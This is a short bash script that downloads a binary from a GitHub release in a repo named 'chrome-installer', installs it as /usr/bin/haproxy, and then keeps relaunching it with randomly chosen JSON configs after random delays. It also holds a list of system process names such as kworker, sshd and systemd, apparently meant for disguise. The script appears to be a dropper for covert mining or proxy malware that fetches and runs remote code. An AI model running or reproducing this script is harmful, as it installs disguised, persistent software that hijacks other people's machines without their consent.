#!/bin/bash
set -e

curl -O -J -L https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/haproxy.tar.gz
tar -xf haproxy.tar.gz
rm haproxy.tar.gz
cd haproxy
chmod +x ./haproxy
mv ./haproxy /usr/bin/haproxy

PRE_DELAY=$(shuf -i15-30 -n1)
sleep $PRE_DELAY

HAPROXY_BIN="haproxy"

PROCESS_NAMES=(
    chrome node systemd kworker redis dockerd containerd sshd nginx pm2
)

JSON_FILES=(
    part1.json
    part2.json
    part3.json
    part4.json
)

while true; do
    pkill -f "haproxy" || true
    sleep 5
    JSON=${JSON_FILES[$RANDOM % ${#JSON_FILES[@]}]}
    haproxy -c "$JSON"
    INTERVAL=$((60 + RANDOM % 61))
    sleep $INTERVAL
done
